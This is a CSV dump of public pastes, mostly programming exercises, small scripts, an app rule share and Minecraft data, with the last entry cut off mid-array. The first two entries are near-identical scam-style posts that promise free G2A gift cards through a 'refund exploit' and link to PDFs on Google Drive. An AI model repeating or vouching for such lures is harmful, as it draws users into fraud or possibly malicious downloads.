id,title,username,language,date,content
7sqGfNZh,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Saturday 13th of April 2024 06:45:35 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
 
Working as of:
13 April 2024"
8Z5GML1Z,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Saturday 13th of April 2024 06:43:02 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_579392.pdf

Working as of:
13 April 2024"
tTWVNgQ1,Untitled,35657,C++,Saturday 13th of April 2024 06:28:36 AM CDT,"
#include <iostream>

using namespace std;

void reverse(int number) {
    if (number < 10) {
        cout << number;
    }
    else {
        cout << number % 10; 
        reverse(number / 10); 
    }
}


int main() {
    setlocale(LC_ALL, ""ru"");

    reverse(7563);

}"
1jQ5GQ4Z,data895,TestGuy1,JSON,Saturday 13th of April 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '31d170a67989e23e1449237783ebab3a83538db566211684bd1cf420278b11795ef3626b1166faecb31421c77c3beae8a3ffa116be63343f22aab1707336fcfc06e808c81859f10986fc2234255bf1d7522d23a2f1c0ea498d87f0ae114592ff77942eb6a90ef6575067dd7fd2e2a7c603d394aee6b1ad2e0e923a2c96822c13',
  otherdata: [
    'bb18558019fcaf8e4adfe6f0e1db784d',
    'd543db2a6496ccd8e1a6b4b2390b301a',
    '9b492a3bdc376cff963e4f3530f0115a',
    '98e458467c56af8b21bffbd3ee22cf9d',
    '40af9eefc069e55d188cf50853086531',
    '8867ea306bb72c49e2f0b0812612431e',
    '062b7bb9ca27a26806e3df0911140897',
    '2d81bfa8d5e2805d53666892f7fc5ef2'
  ]
}"
jPzBnkPE,Untitled,35657,C++,Saturday 13th of April 2024 05:55:40 AM CDT,"
#include <iostream>

using namespace std;

void tower(int n, char src, char dest, char temp) {
    if (n == 0) {
        return;
    }
    tower(n - 1, src, temp, dest);
    cout << n << "" "" << src << "" -> "" << dest << endl;
    tower(n - 1, temp, dest, src);
}


int main() {
    setlocale(LC_ALL, ""ru"");

    tower(3, 'A', 'C', 'B');

}"
kenKH2wj,06. Building,myrdok123,Java,Saturday 13th of April 2024 05:17:37 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P06Building {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

             int floors = Integer.parseInt(scanner.nextLine());
             int rooms = Integer.parseInt(scanner.nextLine());

        for (int i = floors; i >= 1 ; i--) {

            for (int j = 0; j < rooms; j++) {

                if (i == floors){
                    System.out.printf(""L%d%d "", i, j);
                } else if (i % 2 == 0) {
                    System.out.printf(""O%d%d "", i, j);
                }else {
                    System.out.printf(""A%d%d "", i, j);
                }

            }

            System.out.println();

        }
    }
}
"
J3P2T0j4,05. Travelling,myrdok123,Java,Saturday 13th of April 2024 05:16:42 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P05Travelling {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String destination = scanner.nextLine();

        while (!destination.equals(""End"")){
            double neededMoney = Double.parseDouble(scanner.nextLine());

            double savedMoney = 0;
            while (neededMoney > savedMoney){
                double currentMoney = Double.parseDouble(scanner.nextLine());
                savedMoney += currentMoney;
            }

            System.out.printf(""Going to %s!%n"", destination);

            destination = scanner.nextLine();
        }


    }
}
"
HTpunDQN,04. Sum of Two Numbers,myrdok123,Java,Saturday 13th of April 2024 05:16:16 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P04SumOfTwoNumbers {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        int firstNumber = Integer.parseInt(scanner.nextLine());
        int secondNumber = Integer.parseInt(scanner.nextLine());
        int magicNumber = Integer.parseInt(scanner.nextLine());

        int countCombination = 0;
        boolean flag = false;

        for (int first = firstNumber; first <= secondNumber ; first++) {

            for (int second = firstNumber; second <= secondNumber ; second++) {
                countCombination++;
                int currentCombination = first + second;

                if (currentCombination == magicNumber){
                    System.out.printf(""Combination N:%d (%d + %d = %d)"", countCombination, first, second, magicNumber);
                    flag = true;
                    break;
                }

            }

            if(flag){
                break;
            }

        }
        if(!flag){
            System.out.printf(""%d combinations - neither equals %d"", countCombination, magicNumber);
        }
    }
}
"
cqcygGqU,03. Combinations,myrdok123,Java,Saturday 13th of April 2024 05:15:44 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P03Combinations {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        int number = Integer.parseInt(scanner.nextLine());

        int countCombinations = 0;

        for (int x1 = 0; x1 <= number; x1++) {

            for (int x2 = 0; x2 <= number; x2++) {

                for (int x3 = 0; x3 <= number; x3++) {

                    int currentCombination = x1 + x2 + x3;

                    if (currentCombination == number){

                        countCombinations++;

                    }

                }
            }

        }

        System.out.println(countCombinations);


    }
}
"
pHTmh1fA,02. Multiplication Table,myrdok123,Java,Saturday 13th of April 2024 05:14:58 AM CDT,"package NestedLoops;

public class P02MultiplicationTable {

    public static void main(String[] args) {


        for (int firstMultiplier = 1; firstMultiplier <= 10; firstMultiplier++) {

            for (int secondMultiplier = 1; secondMultiplier <= 10 ; secondMultiplier++) {

                System.out.printf(""%d * %d = %d%n"", firstMultiplier, secondMultiplier, firstMultiplier * secondMultiplier );

            }

        }

    }
}
"
Wdg7d8gD,01. Clock,myrdok123,Java,Saturday 13th of April 2024 05:14:32 AM CDT,"package NestedLoops;


public class P01Clock {

    public static void main(String[] args) {

        for (int hours = 0; hours <= 23; hours++) {

            for (int minutes = 0; minutes <= 59; minutes++) {

                System.out.printf(""%d:%d%n"", hours, minutes);

            }

        }

    }
}
"
hbiJCZee,3.LoadMeals,Silviya7,JavaScript,Saturday 13th of April 2024 05:09:51 AM CDT,"const baseURL='http://localhost:3030/jsonstore/tasks/';

const BtnLoadMeals= document.getElementById('load-meals');
const BtnAddMeal=document.getElementById('add-meal');
const ElementList= document.getElementById('list');

const Elementfood= document.getElementById('food');
const Elementtime= document.getElementById('time');
const Elementcalories= document.getElementById('calories');


const LoadMelas=
BtnLoadMeals.addEventListener('click',async ()=>{
    //Fetch all meals
    const response=await fetch(baseURL);
    const data= await response.json();
    console.log(Object.values(data));
    
    ElementList.innerHTML='';

    for (const meal of Object.values(data)) {        
        const mealBtndiv= document.createElement('div');
        mealBtndiv.id='meal-buttons';

        const BtnChange=document.createElement('button');
        BtnChange.classList.add('change-meal');
        BtnChange.textContent='Change';

        const BtnDelete=document.createElement('button');
        BtnDelete.classList.add('delete-meal');
        BtnDelete.textContent='Delete';

        mealBtndiv.appendChild(BtnChange);
        mealBtndiv.appendChild(BtnDelete);

        const Elementh1=document.createElement('h2');
        Elementh1.textContent= meal.food;
        const Elementhtime3=document.createElement('h3');
        Elementhtime3.textContent= meal.time;
        const Elementhcalories3=document.createElement('h3')
        Elementhcalories3.textContent= meal.calories;

        const divMeal= document.createElement('div');
        divMeal.classList.add('meal');
        divMeal.appendChild(Elementh1);
        divMeal.appendChild(Elementhtime3);
        divMeal.appendChild(Elementhcalories3);
        divMeal.appendChild(mealBtndiv);

        ElementList.appendChild(divMeal);

    }

});
"
VwtFhaw4,Modeminfo support Dell modem,manssizz,Bash,Saturday 13th of April 2024 05:00:21 AM CDT,"# Masuk ke direktori script modeminfo
cd /usr/share/modeminfo/scripts

# Download module untuk modem Dell DW5821e
wget https://raw.githubusercontent.com/koshev-msk/modemfeed/master/packages/net/modeminfo/root/usr/share/modeminfo/scripts/DELL.at
wget https://raw.githubusercontent.com/koshev-msk/modemfeed/master/packages/net/modeminfo/root/usr/share/modeminfo/scripts/DELL

# Masuk konfigurasi modeminfo di luci lalu klik configuration atau setup
# Pilih usb atau dataport ke /dev/ttyUSB0 atau /dev/ttyUSB1 (sesuaikan sampai muncul)
# Klik save & apply
# Masuk lagi ke modeminfo luci, ke details
# Tunggu aja, nanti juga muncul 
"
G6uwakwH,Untitled,35657,C++,Saturday 13th of April 2024 04:43:04 AM CDT,"
#include <iostream>

using namespace std;

int binary_search(int* arr, int x, int left, int right) {

    if (left >= right) {
        return -1;
    }

    int mid = (left + right) / 2;

    if (arr[mid] == x) {
        return mid;
    }
    else if (arr[mid] > x) {
        return binary_search(arr, x, left, mid);
    }
    else {
        return binary_search(arr, x, mid + 1, right);
    }
}


// функция линейного поиска для сравнения
int search(int* arr, int size, int x) {
    for (int i = 0; i < size; i++) {
        if (arr[i] == x) {
            return i;
        }
    }
    return -1;
}

int main() {
    setlocale(LC_ALL, ""ru"");

    const int size = 200000;

    int arr[size];

    for (int i = 0; i < size; i++) {
        arr[i] = i;
    }

    int index, x = 153879;

    int start_time = clock();

    for (int i = 0; i < 100000; i++) {
        index = binary_search(arr, x, 0, size);
    }

    int end_time = clock();

    cout << ""index "" << index << "", time "" << end_time - start_time << "" milliseconds"" << endl;

    start_time = clock();

    for (int i = 0; i < 100000; i++) {
        index = search(arr, size, x);
    }
    
    end_time = clock();

    cout << ""index "" << index << "", time "" << end_time - start_time << "" milliseconds"" << endl;

}"
kj9ZuQPa,Sessions list,ur9rgi,Lua,Saturday 13th of April 2024 04:16:04 AM CDT,"[TEST],0:00AM/PM - GMT"
Mr3FuF8D,GPS,TurtleBull,Lua,Saturday 13th of April 2024 03:48:13 AM CDT,"--Central GPS Config
ComputerLabel = os.getComputerLabel()
PasteBinCode = ""Mr3FuF8D""
if     ComputerLabel == 'TB_GPS_1' then loc={x=1726,z=105,y=1255}
elseif ComputerLabel == 'TB_GPS_2' then loc={x=1745,z=105,y=1255}
elseif ComputerLabel == 'TB_GPS_3' then loc={x=1745,z=117,y=1249}
elseif ComputerLabel == 'TB_GPS_4' then loc={x=1745,z=117,y=1255}
else
	loc={x=0,y=0,z=0}
end

if loc.x~=0 and loc.y~=0 and loc.z~=0 then 
	term.clear()
	term.setCursorPos(1,1); term.write(""Pastebin GPS - "" ..PasteBinCode)
	term.setCursorPos(1,2); term.write(""========================"")
	term.setCursorPos(1,3); term.write(""Name:     ""..ComputerLabel)
	term.setCursorPos(1,4); term.write(""Location: ""..loc.x.."",""..loc.z.."",""..loc.y)
	term.setCursorPos(1,6);
	shell.run(""gps"",""host"",loc.x,loc.z,loc.y)
else
	term.setCursorPos(1,1); term.write(""Pastebin GPS - "" ..PasteBinCode)
	term.setCursorPos(1,2); term.write(""========================"")
	term.setCursorPos(1,3); term.write(""Name:     ""..ComputerLabel)
	term.setCursorPos(1,4); term.write(""ERROR; UNKNOWN TERMINAL NAME"")
	term.setCursorPos(1,6)
end


	
	
"
SCspHDMz,邀您一起看：新的,xiaomianao666,JavaScript,Saturday 13th of April 2024 02:43:14 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥新的@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5paw55qEXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcInRleHRfM1wiLFwiZmluZF9ydWxlXCI6XCJqczogXFxudmFyIGQgPSBbXTtcXG52YXIgcnVsZSA9IEpTT04ucGFyc2UoZmV0Y2goZ2V0VmFyKFxcXCJydWxlc0ltcG9ydFVybFxcXCIpKSk7XFxuaWYgKHJ1bGUgIT0gbnVsbCAmJiBydWxlLmxlbmd0aCA+IDApIHtcXG4gaWYgKHJ1bGVbMF0uZmluZF9ydWxlICE9IG51bGwpIHtcXG4gdmFyIHBhc3NXb3JkMSA9ICc1clczNlppVTZLZUc1NVdNNzd5TTZhYVc2YUcxNmFLUjZZR1Q1WkNJNlp1Rzc3K2xhRzl0WlY5eWRXeGxYM1Z5Yk8rL3BRPT0nLFxcbiBwYXNzV29yZDIgPSAnNXJXMzZaaVU2S2VHNTVXTTZLZUU1WWlaNVlpRzVMcXI3N3lNNWIyVDVZbU41WWlHNUxxcjU1cUU1cGl2Nzd5YTZhYVc2YUcxNmFLUjZZR1Q3NytsYUc5dFpWOXlkV3hsNzcrbCc7XFxuIH0gZWxzZSB7XFxuIHZhciBwYXNzV29yZDEgPSAnNXJXMzZaaVU2S2VHNTVXTTc3eU01TG1tNTYyKzZLZUU1WWlaNzcrbFltOXZhMjFoY210ZmRYSnM3NytsJyxcXG4gcGFzc1dvcmQyID0gJzVyVzM2WmlVNktlRzU1V003N3lNNUxtbTU2Mis2S2VFNVlpWjc3K2xZbTl2YTIxaGNtdnZ2NlU9JztcXG4gfVxcbn1cXG50cnkge1xcbiB2YXIgZ3JvdXBzPXt9O1xcbiBmb3IgKHZhciBpID0gMDsgaSA8IHJ1bGUubGVuZ3RoOyBpKyspIHtcXG4gdmFyIGdyb3VwID0gcnVsZVtpXVsnZ3JvdXAnXTtcXG4gaWYoZ3JvdXA9PW51bGwgfHwgZ3JvdXA9PVxcXCJcXFwiKXtcXG4gICAgIGdyb3VwPVxcXCLml6DliIbnu4Tkv6Hmga9cXFwiO1xcbiB9XFxuIGlmKGdyb3Vwc1tncm91cF09PW51bGwpe1xcbiAgICAgZ3JvdXBzW2dyb3VwXT1bXVxcbiB9XFxuIGdyb3Vwc1tncm91cF0ucHVzaChydWxlW2ldKTtcXG4gfVxcbiB2YXIgcmVzdWx0PU9iamVjdC5rZXlzKGdyb3VwcykubWFwKGtleT0+Z3JvdXBzW2tleV0pO1xcbiAvL3NldEVycm9yKEBMb3lEZ0lrKTtcXG4gZm9yICh2YXIgaSBpbiByZXN1bHQpIHtcXG4gICAgIHB1dFZhcigncnVsZXNJbXBvcnRHcm91cCcraSxKU09OLnN0cmluZ2lmeShyZXN1bHRbaV0pKTtcXG4gZC5wdXNoKHtcXG4gdGl0bGU6ICfigJjigJjigJnigJk8c3Ryb25nPjxmb250IGNvbG9yPVxcXCIjMzU4Y2NkXFxcIj4nK3Jlc3VsdFtpXVswXS5ncm91cCArICfvvIjngrnlh7vlr7zlhaXor6XliIbnu4TvvIk8L2Zyb250Pjwvc3Ryb25nPicsXFxuIHVybDogJChcXFwiXFxcIikubGF6eVJ1bGUoKFtpLHBhc3NXb3JkMV0pPT57XFxuICAgICBjb25zdCBmaWxlPSdoaWtlcjovL2ZpbGVzL3RtcC9pbXBvcnQuanNvbic7XFxuICAgICB3cml0ZUZpbGUoZmlsZSxnZXRWYXIoJ3J1bGVzSW1wb3J0R3JvdXAnK2kpKTtcXG4gICAgIHJldHVybiAncnVsZTovLycgKyBiYXNlNjRFbmNvZGUoYmFzZTY0RGVjb2RlKHBhc3NXb3JkMSkgKyBmaWxlKS5yZXBsYWNlKC9cXFxcbi9nLCAnJylcXG4gfSxbaSxwYXNzV29yZDFdKSxcXG4gY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcbiB9KTtcXG4gZm9yICh2YXIgaWkgPSAwOyBpaSA8IHJlc3VsdFtpXS5sZW5ndGg7IGlpKyspIHtcXG4gdmFyIHIgPSB7fTtcXG4gdmFyIGogPSByZXN1bHRbaV1baWldO1xcbiByLnRpdGxlID0gai50aXRsZTtcXG4gaWYgKHJ1bGVbMF0uZmluZF9ydWxlICE9IG51bGwpIHtcXG4gci51cmwgPSAncnVsZTovLycgKyBiYXNlNjRFbmNvZGUoYmFzZTY0RGVjb2RlKHBhc3NXb3JkMikgKyBKU09OLnN0cmluZ2lmeShqKSkucmVwbGFjZSgvXFxcXG4vZywgJycpO1xcbiB9IGVsc2Uge1xcbiByLnVybCA9ICdydWxlOi8vJyArIGJhc2U2NEVuY29kZShiYXNlNjREZWNvZGUocGFzc1dvcmQyKSArIGoudGl0bGUgKyBiYXNlNjREZWNvZGUoJzc3K2wnKSArIGoudXJsICsgYmFzZTY0RGVjb2RlKCc3NytsJykgKyBqLmdyb3VwKS5yZXBsYWNlKC9cXFxcbi9nLCAnJyk7XFxuIH1cXG4gZC5wdXNoKHIpO1xcbiB9XFxuIH1cXG59IGNhdGNoKGUpIHtcXG4gZC5wdXNoKHtcXG4gdGl0bGU6ICfliqDovb3plJnor68nLFxcbiB1cmw6ICdoaWtlcjovL2hvbWUnLFxcbiBkZXNjOiAn6ZSZ6K+v5L+h5oGv77yaJytlLFxcbiBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnXFxuIH0pO1xcbn1cXG5wdXRWYXIoe1xcbiBrZXk6ICd1cmwnLFxcbiB2YWx1ZTogZ2V0VXJsKClcXG59KTtcXG5zZXRSZXN1bHQoZCk7XCIsXCJncm91cFwiOlwiXCJ9IiwidGl0bGUiOiLmlrDnmoQifQ==
GDkAcMJc,Untitled,35657,C++,Saturday 13th of April 2024 02:42:33 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru"");

    char line[40];
    gets_s(line);
    int num = strlen(line) + 1;
    cout << ""Занято "" << num << "", свободно "" << 40 - num << endl;
}"
xFfV5HXV,BBS ReCaptcha Fix (Script Breaking),Degritone,JavaScript,Saturday 13th of April 2024 02:34:17 AM CDT,"// ==UserScript==
// @name         BBS Captcha Fix iFrame
// @version      1.0
// @description  Fix the BBS's Recaptcha with an iframe, which breaks most other scripts
// @author       Degritone
// @match        *://dollars-bbs.org/*
// @grant        none
// @run-at       document-end
// ==/UserScript==


function replaceHTML(){
  let html = document.getElementsByTagName(""html"")[0].outerHTML
    .replace(`var self=`,`var nameWithoutCollision = `)
    .replace(`<script type=""text/javascript"" src=""/random/kareha.js""></script>`,karehaUpdated)
    .replace(`<body class=""mainpage"">`,"""")
    .replace(`</head>`,"""")
    .replace(""<head>"",`<body class=""mainpage"">`)

  let iframe = document.createElement(""iframe"");
  iframe.style.cssText = `
    position:fixed;
    left:0px;
    right:0px;
    top:0px;
    bottom:0px;
    border:0px;
    width:100%;
    height:100%;
  `;

  document.body.innerHTML = """";
  document.body.appendChild(iframe);

  iframe.contentWindow.document.open();
  iframe.contentWindow.document.write(""<!doctype html>""+html);
  iframe.contentWindow.document.close();
}

let karehaUpdated = `<script>function require_script_version(v)
{
	if(v!=""3.a"") alert("""");
}



function show(id)
{
	var style=document.getElementById(id).style;
	if(style.display) style.display="""";
	else style.display=""none"";
}

function insert(text,thread)
{
	var textarea=document.getElementById(""postform""+thread).comment;
	if(textarea)
	{
		if(textarea.createTextRange && textarea.caretPos) // IE
		{
			var caretPos=textarea.caretPos;
			caretPos.text=caretPos.text.charAt(caretPos.text.length-1)=="" ""?text+"" "":text;
		}
		else if(textarea.setSelectionRange) // Firefox
		{
			var start=textarea.selectionStart;
			var end=textarea.selectionEnd;
			textarea.value=textarea.value.substr(0,start)+text+textarea.value.substr(end);
			textarea.setSelectionRange(start+text.length,start+text.length);
		}
		else
		{
			textarea.value+=text+"" "";
		}
		textarea.focus();
	}
}

function w_insert(text,link)
{
	if(document.body.className==""mainpage"") document.location=link+""#i""+text;
	else insert(text,"""");
}

function size_field(id,rows) { document.getElementById(id).comment.setAttribute(""rows"",rows); }

function submit_form(btn)
{
	btn.disabled = true;
	btn.value = ""Please wait..."";
	btn.form.submit();
}

function delete_post(thread,post,file)
{
	if(confirm(""Are you sure you want to delete reply ""+post+""?""))
	{
		var fileonly=false;
		var script=document.forms[0].action;
		var password=document.forms[0].password.value;

		if(file) fileonly=confirm(""Leave the reply text and delete the only file?"");

		document.location=script
		+""?task=delete""
		+""&delete=""+thread+"",""+post
		+""&password=""+password
		+""&fileonly=""+(fileonly?""1"":""0"");
	}
}

function preview_post(formid,thread)
{
	var form=document.getElementById(formid);
	var preview=document.getElementById(""preview""+thread);

	if(!form||!preview) return;

	preview.style.display="""";
	preview.innerHTML=""<em>Loading...</em>"";

	var text;
	text=""task=preview"";
	text+=""&comment=""+encodeURIComponent(form.comment.value);
	text+=""&markup=""+encodeURIComponent(form.markup.value);
	if(thread) text+=""&thread=""+thread;

	var xmlhttp=get_xmlhttp();
	xmlhttp.open(""POST"",nameWithoutCollision);
	xmlhttp.onreadystatechange=function() {
		if(xmlhttp.readyState==4) preview.innerHTML=xmlhttp.responseText;
	}
	if(is_ie()||xmlhttp.setRequestHeader) xmlhttp.setRequestHeader(""Content-Type"",""application/x-www-form-urlencoded"");
	xmlhttp.send(text);
}

function get_xmlhttp()
{
	var xmlhttp;
	try { xmlhttp=new ActiveXObject(""Msxml2.XMLHTTP""); }
	catch(e1)
	{
		try { xmlhttp=new ActiveXObject(""Microsoft.XMLHTTP""); }
		catch(e1) { xmlhttp=null; }
	}

	if(!xmlhttp && typeof XMLHttpRequest!='undefined') xmlhttp=new XMLHttpRequest();

	return(xmlhttp);
}

function is_ie()
{
	return(document.all&&!document.opera);
}



function set_new_inputs(id)
{
	var el=document.getElementById(id);

	if(!el||!el.link) return;

	if(!el.field_a.value) el.field_a.value=get_cookie(""name"");
	if(!el.password.value) el.password.value=get_password(""password"");
	if(el.markup&&!el.comment.value) el.markup.value=get_cookie(""markup"");
	select_markup(el.markup);
}

function set_delpass(id)
{
	with(document.getElementById(id)) password.value=get_cookie(""password"");
}

function make_password()
{
	var chars=""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"";
	var pass='';

	for(var i=0;i<8;i++)
	{
		var rnd=Math.floor(Math.random()*chars.length);
		pass+=chars.substring(rnd,rnd+1);
	}

	return(pass);
}

function get_password(name)
{
	var pass=get_cookie(name);
	if(pass) return pass;
	return make_password();
}

function select_markup(sel)
{
	if(!window.markup_descriptions) return;

	var el=sel;
	while(el=el.nextSibling) if(el.nodeName.toLowerCase()==""small"") break;

	if(el) el.innerHTML=markup_descriptions[sel.value];
}



function get_cookie(name)
{
	with(document.cookie)
	{
		var regexp=new RegExp(""(^|;\\s+)""+name+""=(.*?)(;|$)"");
		var hit=regexp.exec(document.cookie);
		if(hit&&hit.length>2) return unescape(hit[2]);
		else return '';
	}
};

function set_cookie(name,value,days)
{
	if(days)
	{
		var date=new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires=""; expires=""+date.toGMTString();
	}
	else expires="""";
	document.cookie=name+""=""+value+expires+""; path=/"";
}

function set_stylesheet(styletitle)
{
	var links=document.getElementsByTagName(""link"");
	var found=false;
	for(var i=0;i<links.length;i++)
	{
		var rel=links[i].getAttribute(""rel"");
		var title=links[i].getAttribute(""title"");
		if(rel.indexOf(""style"")!=-1&&title)
		{
			links[i].disabled=true; // IE needs this to work. IE needs to die.
			if(styletitle==title) { links[i].disabled=false; found=true; }
		}
	}
	if(!found) set_preferred_stylesheet();
}

function set_preferred_stylesheet()
{
	var links=document.getElementsByTagName(""link"");
	for(var i=0;i<links.length;i++)
	{
		var rel=links[i].getAttribute(""rel"");
		var title=links[i].getAttribute(""title"");
		if(rel.indexOf(""style"")!=-1&&title) links[i].disabled=(rel.indexOf(""alt"")!=-1);
	}
}

function get_active_stylesheet()
{
	var links=document.getElementsByTagName(""link"");
	for(var i=0;i<links.length;i++)
	{
		var rel=links[i].getAttribute(""rel"");
		var title=links[i].getAttribute(""title"");
		if(rel.indexOf(""style"")!=-1&&title&&!links[i].disabled) return title;
	}
}

function get_preferred_stylesheet()
{
	var links=document.getElementsByTagName(""link"");
	for(var i=0;i<links.length;i++)
	{
		var rel=links[i].getAttribute(""rel"");
		var title=links[i].getAttribute(""title"");
		if(rel.indexOf(""style"")!=-1&&rel.indexOf(""alt"")==-1&&title) return title;
	}
	return null;
}



window.onunload=function(e)
{
	if(style_cookie)
	{
		var title=get_active_stylesheet();
		set_cookie(style_cookie,title,365);
	}
}

window.onload=function(e)
{
	var inputs = document.getElementsByTagName(""input"");
  for (var i = 0; i < inputs.length; i++) {
    if (inputs[i].type.toLowerCase() === ""submit"") {
      inputs[i].disabled = false;
    }
  }
	if(match=/#i(.+)/.exec(document.location.toString()))
	if(!document.getElementById(""postform"").comment.value)
	insert(unescape(match[1]),"""");
}

if(style_cookie)
{
	var cookie=get_cookie(style_cookie);
	var title=cookie?cookie:get_preferred_stylesheet();
	set_stylesheet(title);
}

var captcha_key=make_password();</script>`

replaceHTML();"
fZnziAP0,Untitled,35657,C++,Saturday 13th of April 2024 02:28:06 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    char line[40] = ""My line"";

    //cin >> line; // считывает символы до первого пробела

    //gets_s(line); // считывает вместе с пробелами (до перевода строки по Enter)

    //cout << line;

    cout << ""Длина строки: "" << strlen(line) << endl; // определяет длину строки (количество символов)

    char line2[40];

    strcpy(line2, line);

    /*for (int i = 0; i <= strlen(line); i++) {
        line2[i] = line[i];
    }*/

    cout << line2 << endl;

    cout << strcmp(line, line2) << endl; // сравнивает две строки лексикографически, возвращает 0 если они равны, -1 если левая меньше правой, 1 если левая больше правой

    strcat(line2, "" - line2""); // дописывает указанное содержимое в конец строки line2

    cout << line2 << endl;

    cout << strchr(line2, '-') << endl; // находит позицию данного символа и возвращает указатель на него (либо 0 если не нашел)

    cout << strstr(line2, ""ine"") << endl; // ищет подстроку в указанной строке, возвращает указатель на неё или 0
}"
0r1KRW6V,gazebo,jkw010,JSON,Saturday 13th of April 2024 01:47:27 AM CDT,"{
  ""name"": ""gazebo"",
  ""statePosArrayList"": ""{blockstatemap:[{Name:\""minecraft:air\""},{Name:\""twilightforest:twilight_oak_planks\""},{Name:\""minecraft:mangrove_log\"",Properties:{axis:\""y\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""true\"",north:\""false\"",south:\""false\"",waterlogged:\""false\"",west:\""true\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""true\"",north:\""false\"",south:\""true\"",waterlogged:\""false\"",west:\""false\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""false\"",north:\""true\"",south:\""false\"",waterlogged:\""false\"",west:\""true\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""true\"",north:\""true\"",south:\""false\"",waterlogged:\""false\"",west:\""false\""}},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""false\"",north:\""false\"",south:\""true\"",waterlogged:\""false\"",west:\""true\""}},{Name:\""minecraft:mangrove_planks\""},{Name:\""minecraft:mangrove_fence\"",Properties:{east:\""false\"",north:\""true\"",south:\""true\"",waterlogged:\""false\"",west:\""false\""}},{Name:\""minecraft:mangrove_trapdoor\"",Properties:{facing:\""west\"",half:\""top\"",open:\""false\"",powered:\""false\"",waterlogged:\""false\""}},{Name:\""minecraft:mangrove_trapdoor\"",Properties:{facing:\""east\"",half:\""top\"",open:\""false\"",powered:\""false\"",waterlogged:\""false\""}},{Name:\""minecraft:mangrove_trapdoor\"",Properties:{facing:\""south\"",half:\""top\"",open:\""false\"",powered:\""false\"",waterlogged:\""false\""}},{Name:\""minecraft:mangrove_trapdoor\"",Properties:{facing:\""north\"",half:\""top\"",open:\""false\"",powered:\""false\"",waterlogged:\""false\""}}],endpos:{X:18,Y:10,Z:0},startpos:{X:0,Y:0,Z:-18},statelist:[I;0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,1,1,1,2,0,0,0,0,0,0,0,0,0,0,0,0,2,3,3,3,3,3,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,